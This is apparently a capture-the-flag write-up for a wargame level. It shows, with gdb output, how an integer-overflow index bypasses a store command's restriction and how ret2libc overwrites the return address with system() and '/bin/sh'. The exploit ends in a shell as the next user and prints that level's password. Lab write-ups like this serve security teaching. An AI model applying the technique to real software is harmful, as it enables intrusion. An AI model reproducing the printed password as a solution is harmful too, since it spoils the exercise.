# level07

This program clear `argv` and `env` and waits for a command in a loop:

- `store`: store a number at address `$buffer + $index * 4`
- `read`: read a number at `$buffer + $index * 4`
- `quit`: quit the program

We also can't :

- store a number where number >> 24 == 183
- store a number where index % 3 == 0

Let's try to overwrite `eip`. The passed to  `store_number` function begins at `0xffffd544` in `main`, 456 bytes from `eip`:

```gdb
Input command: store

Breakpoint 1, 0x080488ea in main ()
(gdb) x/wx $esp
0xffffd520:     0xffffd544
(gdb) x/wx $ebp+4
0xffffd70c:     0xf7e45513
(gdb) p/d (0xffffd70c - 0xffffd544) / 4
$8 = 114
```

We can see that a number at index 114 can't be stored (144 % 3 = 0).

By passing the max int `2147483647` + 1, we can see that we write at index 0, so we can add 114 to write on index 114:

```gdb
Input command: store     
 Number: 42
 Index: 2147483648
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 42
 Completed read command successfully
Input command: store
 Number: 42
 Index: 2147483762
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 42
 Completed read command successfully
```

Now, let's find `system` and `/bin/sh`:

```gdb
(gdb) info functions system 
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

```gdb
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"
```

We can now try to overwrite index 114 and 116, as 1st argument is taken from `$ebp + 8` in functions:

[ system() ] [ return address ] [ "/bin/sh" ]

```bash
Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 2147483764
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cd /home/users/level08
$ cat .pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
